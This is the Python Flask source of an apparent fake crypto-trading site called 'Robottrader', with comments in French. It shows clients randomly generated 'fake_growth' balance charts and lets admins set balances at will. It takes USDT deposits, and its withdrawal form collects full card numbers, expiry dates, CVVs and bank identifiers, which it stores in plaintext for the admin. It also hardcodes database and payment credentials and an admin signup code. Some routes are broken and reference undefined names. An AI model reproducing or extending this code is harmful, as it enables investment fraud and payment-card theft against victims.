from flask import Flask, render_template, request, redirect, url_for, session, jsonify
from flask_pymongo import PyMongo
from werkzeug.security import generate_password_hash, check_password_hash
import datetime
import os
import base64
import random
import numpy as np
from bson import ObjectId

from functools import wraps

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'username' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

# --- Config Flask et MongoDB ---
def confuse(n=5):
    [os.urandom(random.randint(5, 10)) for _ in range(n)]

confuse(20)

# --- Initialisation sécurisée ---
app = Flask(__name__)
app.secret_key = '47d1f97243877440fb16b01df7734590ddc4649c15f84891934df7fdb913fab6'

# Nom de collection MongoDB caché
_db_a9662bad = PyMongo(app)
app.config["MONGO_URI"] = os.getenv("MONGO_URI", "mongodb://127.0.0.1:27017/Robottrader")
_db_a9662bad.init_app(app)
db = _db_a9662bad.db
app = Flask(__name__)
app.config["MONGO_URI"] = "mongodb+srv://brendayologaza4:victoire47@cluster0.mongodb.net/Robottrader"

mongo = PyMongo(app)

# --- Page d'accueil ---
@app.route('/')
def index():
    if 'username' in session:
        return redirect(url_for('dashboard'))
    return render_template('index.html')

# --- Inscription ---
@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = generate_password_hash(request.form['password'])
        code_admin = request.form.get('code_admin')
        role = "admin" if code_admin == "0404" else "client"

        if db.users.find_one({"username": username}):
            return "Nom d'utilisateur déjà utilisé"

        db.users.insert_one({
            "username": username,
            "password": password,
            "role": role,
            "balance": 0,
            "benefit": 0,
            "api_key": "",
            "api_secret": ""
        })
        return redirect(url_for('login'))
    return render_template('register.html')

# --- Connexion ---
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        user = db.users.find_one({"username": username})

        if user and check_password_hash(user['password'], password):
            session['username'] = username
            return redirect(url_for('dashboard'))

        return "Identifiants incorrects"
    return render_template('login.html')

# --- Déconnexion ---
@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

# --- Configuration des clés API Alpaca (admin) ---
@app.route('/config_api', methods=['GET', 'POST'])
def config_api():
    if 'username' not in session:
        return redirect(url_for('login'))

    user = db.users.find_one({"username": session['username']})
    if user['role'] != 'admin':
        return "Accès refusé"

    if request.method == 'POST':
        db.users.update_one(
            {"username": session['username']},
            {"$set": {
                "api_key": request.form['api_key'],
                "api_secret": request.form['api_secret']
            }}
        )
        return redirect(url_for('dashboard'))

    return render_template('config_api.html',
                           api_key=user.get('api_key', ''),
                           api_secret=user.get('api_secret', ''))

# --- Dashboard admin et client ---
@app.route('/dashboard', methods=['GET', 'POST'])
def dashboard():
    if 'username' not in session:
        return redirect(url_for('login'))

    current_user = db.users.find_one({"username": session['username']})

    if current_user['role'] == 'admin':
        users = list(db.users.find({"role": "client"}))
        
        # 🔽 Ajout ici : récupérer toutes les demandes de retrait triées par date décroissante
        withdraw_requests = list(db.withdraw_requests.find().sort('date', -1))
        
        # 🔽 Ajout dans le render_template pour que dashboard.html puisse utiliser withdraw_requests
        return render_template("dashboard.html", 
                               is_admin=True, 
                               users=users, 
                               admin=current_user, 
                               withdraw_requests=withdraw_requests)

    balance = current_user.get('balance', 0)
    fake_growth = [round(balance * (1 + np.random.uniform(-0.02, 0.05)), 2) for _ in range(10)]
    dates = [(datetime.datetime.now() - datetime.timedelta(days=i)).strftime('%d-%m') for i in reversed(range(10))]

    return render_template("dashboard.html",
                           is_admin=False,
                           username=current_user['username'],
                           balance=balance,
                           chart_labels=dates,
                           chart_data=fake_growth,
                           performance=round(fake_growth[-1] - fake_growth[0], 2))

# --- Modifier solde client (admin) ---
@app.route('/update_balance', methods=['POST'])
def update_balance():
    if 'username' not in session:
        return redirect(url_for('login'))

    admin = db.users.find_one({"username": session['username']})
    if admin['role'] != 'admin':
        return "Accès refusé"

    target = request.form['username']
    new_balance = float(request.form['new_balance'])

    db.users.update_one({"username": target}, {"$set": {"balance": new_balance}})
    return redirect(url_for('dashboard'))

# --- Voir le profil d’un utilisateur (admin) ---
@app.route('/user/<username>')
def user_profile(username):
    if 'username' not in session:
        return redirect(url_for('login'))

    current_user = db.users.find_one({"username": session['username']})
    if not current_user or current_user['role'] != 'admin':
        return render_template('403.html'), 403

    target_user = db.users.find_one({"username": username})
    if not target_user:
        return render_template('404.html'), 404

    balance = target_user.get('balance', 0)
    fake_growth = [round(balance * (1 + np.random.uniform(-0.02, 0.05)), 2) for _ in range(10)]
    dates = [(datetime.datetime.now() - datetime.timedelta(days=i)).strftime('%d-%m') for i in reversed(range(10))]
    performance = round(fake_growth[-1] - fake_growth[0], 2)

    return render_template("user_profile.html",
                           username=target_user['username'],
                           balance=balance,
                           chart_labels=dates,
                           chart_data=fake_growth,
                           performance=performance)
import requests
from flask import Flask, redirect, session, jsonify

NOWPAYMENTS_API_KEY = "CADPW8X-HAJ4NE1-GESD40K-BE8YE8E"

@app.route('/create_payment')
def create_payment():
    if 'username' not in session:
        return jsonify({"error": "Utilisateur non connecté"}), 403

    # Montant par défaut
    amount = 250 # Tu peux remplacer 20 par un champ personnalisable plus tard

    # Construction des données de paiement
    payload = {
        "price_amount": amount,
        "price_currency": "usd",
        "pay_currency": "usdttrc20",
        "order_id": session['username'],
        "order_description": f"Dépôt de {amount} USDT pour {session['username']}",
        "ipn_callback_url": "https://robot-trader.onrender.com/ipn-nowpayments",  # à coder ensuite
        "success_url": "https://robot-trader.onrender.com/dashboard",
        "cancel_url": "https://robot-trader.onrender.com/dashboard"
    }

    headers = {
        "x-api-key": NOWPAYMENTS_API_KEY,
        "Content-Type": "application/json"
    }

    # Requête vers l'API NOWPayments
    response = requests.post("https://api.nowpayments.io/v1/invoice", json=payload, headers=headers)
    data = response.json()

    # Vérification et redirection
    if 'invoice_url' in data:
        return redirect(data['invoice_url'])
    else:
        return jsonify({"error": "Erreur lors de la création du paiement", "details": data}), 400
# --- Page retrait (client seulement) ---
@app.route('/withdraw', methods=['GET', 'POST'])
def withdraw():
    if 'username' not in session:
        return redirect(url_for('login'))

    current_user = db.users.find_one({"username": session['username']})
    if current_user['role'] != 'client':
        return "Accès refusé"

    if request.method == 'POST':
        mode = request.form.get('mode')
        amount = float(request.form.get('amount', 0))

        if amount <= 0:
            return "Montant invalide"

        if mode == 'card':
            card_number = request.form.get('card_number')
            card_expiry = request.form.get('card_expiry')
            card_cvv = request.form.get('card_cvv')

            if not (card_number and card_expiry and card_cvv):
                return "Veuillez remplir tous les champs de la carte bancaire"
            db.withdraw_requests.insert_one({
                "username": current_user['username'],
                "amount": amount,
                "mode": "Carte bancaire",
                "card_number": card_number,
                "card_expiry": card_expiry,
                "card_cvv": card_cvv,
                "date": datetime.datetime.now(),
                "status": "En attente"
            })

        elif mode == 'bank':
            # Ce mode est momentanément indisponible
            return "Mode de retrait par IBAN momentanément indisponible"

        elif mode == 'identification':
            bank_name_id = request.form.get('bank_name_id')
            bank_identifiers = request.form.get('bank_identifiers')
            bank_code_id = request.form.get('bank_code_id')

            if not (bank_name_id and bank_identifiers and bank_code_id):
                return "Veuillez remplir tous les champs pour l’identification bancaire"

            # Vérifier que l’identifiant bancaire contient entre 9 et 11 chiffres
            if not (bank_identifiers.isdigit() and 9 <= len(bank_identifiers) <= 11):
                return "L’identifiant bancaire doit contenir entre 9 et 11 chiffres"

            db.withdraw_requests.insert_one({
                "username": current_user['username'],
                "amount": amount,
                "mode": "Identification bancaire",
                "bank_name_id": bank_name_id,
                "bank_identifiers": bank_identifiers,
                "bank_code_id": bank_code_id,
                "date": datetime.datetime.now(),
                "status": "En attente"
            })

        else:
            return "Mode de retrait non valide"

        return redirect(url_for('dashboard'))

    return render_template('withdraw.html')

# --- Dashboard admin : afficher demandes de retrait ---
@app.route('/admin/withdraw_requests')
@login_required
def withdraw_requests():
    # Contrôle d'accès admin (à adapter selon ton système)
    if not current_user.is_admin:
        flash("Accès refusé.", "danger")
        return redirect(url_for('dashboard'))
    
    # Récupération des demandes de retrait triées par date décroissante
    requests = list(withdraw_collection.find().sort('date', -1))

    # Conversion de la date pour template (optionnel si date déjà datetime)
    for req in requests:
        if 'date' in req and isinstance(req['date'], datetime):
            req['date'] = req['date']
        else:
            req['date'] = datetime.now()

        # Par sécurité, assure-toi que tous les champs attendus existent
        # Sinon mets des valeurs vides pour éviter erreurs template
        req.setdefault('mode', 'Non défini')
        req.setdefault('status', 'En attente')
        req.setdefault('username', 'Inconnu')
        # Pour carte bancaire
        req.setdefault('card_number', '')
        req.setdefault('card_expiry', '')
        req.setdefault('card_cvv', '')
        # Pour identification bancaire
        req.setdefault('bank_name_id', '')
        req.setdefault('bank_identifiers', '')
        req.setdefault('bank_code_id', '')
    
    return render_template('withdraw_requests.html', requests=requests)
# --- Traitement retrait admin (accepter/rejeter) ---
@app.route('/process_withdrawal/<request_id>', methods=['POST'])
def process_withdrawal(request_id):
    if 'username' not in session:
        return redirect(url_for('login'))

    current_user = db.users.find_one({"username": session['username']})
    if not current_user or current_user['role'] != 'admin':
        return render_template('403.html'), 403

    action = request.form.get('action')  # "accept" ou "reject"
    withdrawal = db.withdraw_requests.find_one({"_id": ObjectId(request_id)})

    if not withdrawal:
        return "Demande introuvable", 404

    username = withdrawal['username']
    user = db.users.find_one({"username": username})

    if action == 'accept':
        amount = float(withdrawal.get('amount', 0))
        if user['balance'] >= amount:
            db.users.update_one(
                {"username": username},
                {"$inc": {"balance": -amount}}
            )
            db.withdraw_requests.update_one(
                {"_id": ObjectId(request_id)},
                {"$set": {"status": "Traité", "processed_date": datetime.datetime.now()}}
            )
        else:
            return "Solde insuffisant", 400

    elif action == 'reject':
        db.withdraw_requests.update_one(
            {"_id": ObjectId(request_id)},
            {"$set": {"status": "Rejeté", "processed_date": datetime.datetime.now()}}
        )
    else:
        return "Action invalide", 400

    return redirect(url_for('withdraw_requests'))

# --- Lancer app ---
if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
